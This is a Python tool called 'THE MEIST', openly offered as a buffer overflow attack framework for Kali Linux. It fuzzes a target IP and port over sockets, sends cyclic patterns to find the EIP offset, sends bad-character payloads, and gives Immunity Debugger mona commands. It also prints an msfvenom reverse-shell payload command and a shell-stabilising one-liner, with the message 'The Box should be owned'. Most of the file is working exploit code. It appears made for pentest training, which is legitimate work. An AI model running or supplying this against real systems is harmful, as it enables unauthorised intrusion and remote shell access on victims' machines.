#!/usr/bin/python3
# THEMEIST - A Buffer Overflow Attack Framework
# A project by MEISTSEC
# v2.0.7(Release Candidate)
# https://github.com/MEISTSEC/meist
# Licensed under GNU GPLv3 Standards.  https://www.gnu.org/licenses/gpl-3.0.en.html

import subprocess, os, socket, sys, time, string, webbrowser 


subprocess.call('clear', shell=True)


print('\033[1;31m'+"""

                              THE MEIST 
                   A BUFFER OVERFLOW ATTACK FRAMEWORK"""+'\033[1;m')
print("""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⠿⠟⠛⠻⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣆⣀⣀⠀⣿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠻⣿⣿⣿⠅⠛⠋⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢼⣿⣿⣿⣃⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣟⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣛⣛⣫⡄⠀⢸⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⡆⠸⣿⣿⣿⡷⠂⠨⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⡇⢀⣿⡿⠋⠁⢀⡶⠪⣉⢸⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡏⢸⣿⣷⣿⣿⣷⣦⡙⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣇⢸⣿⣿⣿⣿⣿⣷⣦⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡁⠀⠀
             
                            Version-2.0.7                                         
                       https://wwww.meistsec.com
                https://github.com/MEISTSEC/THEMEIST.git
""")


print ('\033[1;23m'+"                     (Early Development Application)"+'\033[1;m')
print('\033[1;32m'+"""     This is a progressive process. In which, portions of the application will 
     exit upon completion and you will need to document the reflected output in order 
     to enter any changes into the subsequent steps. This application is meant to be deployed
     within Kali Linux and possibly will need adjustments in order to fit the Pentesting environment:"""+'\033[1;m')

#IP enter
print()
print()
target = input("Enter your target IP address: ")
error = ("Invalid Input")
try:
    t_ip = socket.gethostbyname(target)
except (UnboundLocalError, socket.gaierror):
    print("\n[-]Invalid format. Please use a correct IP address[-]\n")
    sys.exit()
targetport = int(input("Enter your target port number here: "))
error = ("Invalid Input")
ip = target
port = targetport
time.sleep(0)
subprocess.call('clear', shell=True)


def menu():  
    print('\033[1;31m'+"""

                                  THE MEIST 
                       A BUFFER OVERFLOW ATTACK FRAMEWORK"""+'\033[1;m')
    print("""                                Version 2.0.7""")
    print("""
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⠿⠟⠛⠻⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣆⣀⣀⠀⣿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠻⣿⣿⣿⠅⠛⠋⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢼⣿⣿⣿⣃⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣟⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣛⣛⣫⡄⠀⢸⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⡆⠸⣿⣿⣿⡷⠂⠨⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⡇⢀⣿⡿⠋⠁⢀⡶⠪⣉⢸⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡏⢸⣿⣷⣿⣿⣷⣦⡙⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣇⢸⣿⣿⣿⣿⣿⣷⣦⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡁⠀⠀
    """) 
    print("")
    print("[1] Fuzz the Application")
    print("[2] Pattern Creation/Crash Replication & Controlling the EIP")
    print("[3] Find Bad Characters")
    print("[4] Find A Jump Point")
    print("[5] Payload Creation")
    print("[6] Exploit the Target")
    #print("[9] Please Select This Option If You Want to Party!")
    print("[0] Exit")

def option1():
    print("APPLICATION FUZZER")
    print('\033[1;32m'+"""Before Starting, in Immunity Debugger enter the following command:"""+'\033[1;m')
    print('\033[1;31m'+"""!mona config -set workingfolder C:\mona\%p"""+'\033[1;m')
    print()
    input("After Inputing the above command in Immunity Debugger please press the Enter Key to continue...")
    time.sleep(1)
    buffer = 'A' * 100

    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                data = bytes(buffer, 'latin-1')
                s.settimeout(5)
                s.connect((ip, port))
                s.recv(1024)
                print('FuzzCentral with {} bytes'.format(len(data)))
                s.send(data)
                s.recv(1024)
        except:
            print('Fuzzer crashed at {}'.format(len(data)))
            print()
            print('Remember the crash point number and continue on to step 2 please...')
            print('Restart the Target application and Immunity Debugger')
            print()
            input("Please press enter to continue:")
            time.sleep(2)
            break
        buffer += 'A' * 100
        time.sleep(1)
    
   
subprocess.call('clear')

def option2():
    print("Pattern Creation:")
    print()
    time.sleep(1)
    crashnum = int(input("Enter the crash number from step 1 here: "))
    print()
    time.sleep(1)
    lvalue = crashnum + 400
    os.system("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l " + str(lvalue))
    print()
    print('\033[1;32m'+"""Copy the output for Step 3!!!!"""+'\033[1;m')
    time.sleep(1)
    input("Press the Enter Key to continue...")
    print()
    input("Make sure you highlighted and copied the output above, and hit Enter one more time...")

    time.sleep(1)
    print()
    print("CRASH APPLLICATION & CONTROLLING THE EIP")
    time.sleep(1)
    step2input = str(input("Enter the output from step 2 here: "))
    print()
    time.sleep(2)
    error = ("Invalid Input")
    time.sleep(1)
    offset = 0
    overflow = "A" * offset
    retn = ""
    padding = ""
    payload = step2input

    buffer = overflow + retn + padding + payload

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((ip, port))

        print("Sending bufferness...")
        s.send(bytes(buffer + "\r\n", "latin-1"))
        print("Complete.")
  
    except:
        print("Failed to connect.")

    time.sleep(1)
    print("Application Should have Crashed")
    input("Press the enter key to continue:")
    print()
    print()
    print('\033[1;32m'+"""Run this command in Immunity Debugger enter here:"""+'\033[1;m')
    print("!mona findmsp -distance " + str(lvalue))
    input("Press the Enter Key to continue...")
    time.sleep(3)
    print()
    print("Within Immunity Debugger look at the output that states 'EIP contains normal pattern': And document the offset number displayed")
    time.sleep(1)
    offsetoutput = int(input("Enter the EIP offset output described above here: "))
    print("Restart the Application and Immunity Debugger")
    input("Press enter to continue:")
    time.sleep(1)
    global offsetnew
    offsetnew = offsetoutput
    overflow = "A" * offsetnew
    retn = "BBBB"
    padding = ""
    payload = step2input

    buffer = overflow + retn + padding + payload

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((ip, port))


        print("Sending bufferness...")
        s.send(bytes(buffer + "\r\n", "latin-1"))
        print("Complete.")
  
    except:
        print("Failed to connect.")

    time.sleep(1)

    time.sleep(1)
    print("Application Should have Crashed once again")
    input("Press the Enter Key to continue...")
    subprocess.call('clear', shell=True)
    print()
    print('\033[1;32m'+"""Enter the command below into Immunity Debugger to generate a badchar byte array:"""+'\033[1;m')
    print("!mona bytearray -b '\\x00'")
    input("Press the Enter key to continue...")
    print()
    print()
    print()
    time.sleep(3)
    print('\033[1;32m'+"""Note the specific directory location of the bytearray.bin file in the Immunity Debugger output:"""+'\033[1;m')
    print()
    print()
    print("Restart the application and Immunity Debugger")
    time.sleep(1)
    print()
    global subdir
    subdir = str(input("Enter the subdirectory and include bytearray.bin following that subdirectory under C:\mona\: "))
    print()
    time.sleep(2)
    error = ("Invalid Input")

    
    print()
    time.sleep(2)
    input("Press the Enter Key to continue...Once returned to the main menu continue onto step 3")
    print()
subprocess.call('clear')

def option3():
    print("Badchar generation!")
    print("Pattern Creation:")
    time.sleep(1)
    print()
    time.sleep(1)
    input("Press the Enter Key to begin the generation..")
    print()
    time.sleep(3)
    #script
    #This might need to be modified if the format of bytearray script does not meet this criteria. 
    for x in range(1, 256):
            print("\\x" + "{:02x}".format(x), end='')
    print()
    print()
    input("Make sure you highlight and copy the output above, and hit Enter one more time...")
    time.sleep(1)
    subprocess.call('clear', shell=True)
    print("BadChars")
    time.sleep(1)
    #print("Restart the application and Immunity Debugger")
    input("Press Enter to continue.....")
    time.sleep(1)
    print()
    step3input = str(input("Enter badchars generated here: "))
    print()
    time.sleep(2)
    error = ("Invalid Input")
    time.sleep(1)
    overflow = "A" * offsetnew
    retn = ""
    padding = ""
    payload = step3input

    buffer = overflow + retn + padding + payload

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((ip, port))

        print("Sending bufferness...")
        s.send(bytes(buffer + "\r\n", "latin-1"))
        print("Complete.")
  
    except:
        print("Failed to connect.")

    time.sleep(1)

    time.sleep(1)
    print("Application Should have Crashed once again")
    print()
    input("Press enter to continue:")
    print()
    esp = str(input("Enter the ESP register point here:  "))
    print()
    time.sleep(2)
    print('\033[1;32m'+"""Enter the following command into Immunity"""+'\033[1;m')
    #it was C:\mona\ "+str((
    print("!mona compare -f C:\mona\\"+str((subdir))+ ' -a ' + str((esp)))
    print()
    time.sleep(3)
    print()
    print()
    print('In immunity debugger a pop with up Mona Memory comparison results should be displayed')
    print('Not all may be badchars')
    print('Sometimes badchars make the next byte get corrupted or even the rest of the string')
    print('Document the Badchars from the mona Memory comparison result. Restart the application and Immunity. Press enter to continue:')
    input()
    example = ("\\x00\\x03\\x3e\\xa0")
    badchar = str(input("Enter the badchars displayed in immunity debugger here. It should look like: " + str((example)) + " etc... to include that null byte: "))
    print()
    time.sleep(2)
    print("!mona bytearray -cpb " + ((badchar)))
    print()
    time.sleep(2)
    input("Please press enter to continue on to section 4 of the menu:")
    
menu()
    

subprocess.call('clear')

def option4():
    print("In Immunity Debugger type the following with all the badchars you identified (including \\x00")
    print("!mona jmp -r esp -cpb ")
    print()
    print("Feed the retn variable, remember this is written backwards [little endian] e.g if the address is \\x01\\x02\\x03\\x04 write it as \\x04\\x03\\x02\\x01 in the following input prompt.") 
    print("********Start and end with double quotes****************")
    retninput = str(input("Enter the address here:"))
    global retnmaster
    retnmaster = retninput
    print()
    time.sleep(2)
    error = ("Invalid Input")
    time.sleep(1)
    print("Open up shellpopper.py after making it executable in your editor for step 5 input. Do you want to open a webbrowser link to the URL? Select [Y/n] to continue: ")
    answer = input()
    if answer == 'Y':
        webbrowser.open('https://raw.githubusercontent.com/MEISTSEC/THEMEIST/main/SHELLPOPPER.py')
    elif answer == 'n':
        time.sleep(3)
        #input("Press enter to continue to step 5:")
    else: 
        print("Invalid Option")
    input("Press enter to continue to step 5:")
    time.sleep(1)
    subprocess.call('clear')
menu()


subprocess.call('clear')
def option5():
    print()
    print("In Kali Linux run the following command with all the badchar you identified including \\x00 to generate a payload:")
    print()
    print()
    print ('\033[1;23m'+"msfvenom -p windows/shell_reverse_tcp LHOST=Your_IP LPORT=4444 EXITFUNC=thread -b '\\x00' -f c"+'\033[1;m')
    print()
    print('Copy the generated C code strings into an editor and add in a starting [(] as the first character and a closing [)] as the last character when integrating it as a payload in the program: ')
    print()
    print("Enter the generated payload into the Shellpopper.py script under the variable [payload]")
    time.sleep(2)
    print()
    input("Press enter to continue to the main menu and move on to step 6 [Exploit the Target]:")
    time.sleep(2)

   


time.sleep(1)
            
subprocess.call('clear')
    



menu()
print()
option = int(input("Please select your option: "))


while option != 0:
    if option == 1:
        option1()
    elif option == 2:
        option2()
    elif option ==3:
        option3()
    elif option ==4:
        option4()
    elif option ==5:
        option5()   
    elif option ==6:  
        time.sleep(3)
        print("Press Enter to display the following information you need to import into the shellpopper.py script:") 
        time.sleep(2)
        print("Offset:")
        print(offsetnew)
        print ("retninput:")
        print(retnmaster)
        input("Press enter to continue:")
        print()
        print()
        print("Start a netcat listner or metsploit using the LPORT you set in the msfvenom payload generation")
        print("After entering the information into shellpopper.py go ahead and execute it!!!!")
        input("Press enter to exploit your target application:")
        print()
        time.sleep(2)
        print('\033[1;23m'+"The Box should be owned. Stabalize your shell with the following command:"+'\033[1;m')
        print("""python -c "import pty;pty.spawn('/bin/bash')""")
        time.sleep(1)   
        input("Press enter to return to the main menu:")
    elif option ==9:
        webbrowser.open('https://www.youtube.com/watch?v=6rAo_W4BWRo')
    else:
        print("Invalid option.")
    print()
    menu()
    option = int(input("Enter your option: "))

    subprocess.call('clear', shell=True)

print("""


                    ("This is what space smells like" (Sun Tzu, 544 BC))
                                                                                          
        ██████████████  ██              ██  ██  ██  ████████    ██  ██████████████        
        ██          ██  ████████  ████  ██████      ██  ██    ██    ██          ██        
        ██  ██████  ██  ████        ██████  ██████████  ██          ██  ██████  ██        
        ██  ██████  ██    ██    ████  ██████      ██    ████  ██    ██  ██████  ██        
        ██  ██████  ██    ████  ████████  ██    ████████  ████      ██  ██████  ██        
        ██          ██  ██      ██  ██████  ████        ██    ████  ██          ██        
        ██████████████  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ██████████████        
                        ████  ██  ████    ██    ████  ████      ██                        
            ██████  ██  ██████  ████  ██████    ██  ██
████████  ████████    ██████        
        ████    ████  ██    ████  ██      ████████      ████  ██████      ██              
          ██    ████████      ████    ██    ████  ██████  ████████  ██████    ████        
          ██  ██          ██    ██████        ████████████  ██  ██  ████      ██          
              ████████████  ████████████    ██    ██████  ██████  ████  ██  ████          
        ██████    ██  ██  ██      ██  ██  ██      ██  ████  ██  ████  ██  ████            
        ██████  ██  ██              ████████    ████████    ████████████████    ██        
            ████          ████████  ██  ██████      ██  ██  ██    ██████      ██          
        ██  ██████████  ██  ██    ██████████  ████    ██████  ██  ████████  ██████        
          ██  ██  ██  ██    ████      ██  ██            ████    ████  ██    ██            
          ████  ██  ████████      ██    ██      ████      ████████  ██████████████        
                      ██    ██    ██  ██████    ██████      ██████████████    ██          
        ████  ████  ██    ████    ██  ████      ██    ██  ██████  ████████  ██            
            ██  ████    ██  ██  ██  ██  ██  ████      ████  ██    ██  ██    ██████        
        ██    ████████      ██  ████    ██  ██████    ██████  ██              ████        
            ██    ██    ██    ████████████        ██        ██    ██████  ██    ██        
          ██████████████    ██  ████████    ████████  ████  ██    ████████████████        
        ██    ██      ██████    ██████      ██  ██  ██      ██  ████████                  
        ██  ██      ████████    ████████  ██████    ██████████████  ██      ██████        
        ██    ████    ██    ████  ██  ████    ██  ██  ██    ██  ████  ██  ██  ██          
        ██    ████  ██    ████████      ██████        ████████████████████  ██  ██        
                        ██  ████  ██      ██  ████    ██  ████████      ██    ██          
        ██████████████      ████      ██  ██  ████  ██    ████  ██  ██  ████  ████        
        ██          ██      ██        ██  ██    ██  ██          ██      ██    ██          
        ██  ██████  ██  ██████████  ██  ██  ██████████████████████████████  ██████        
        ██  ██████  ██  ██    ██  ██  ██████    ██████  ██    ██    ██████████            
        ██  ██████  ██  ██  ██████  ██      ██    ████    ████    ██  ██        ██        
        ██          ██        ██      ████  ██████████  ██      ██████████      ██        
        ██████████████    ████  ████████  ██  ██  ████    ██        ██████████████ 

              PLEASE VISIT OUR SITE WITH THE QR CODE TO SUPPORT THE PROJECT
         

""")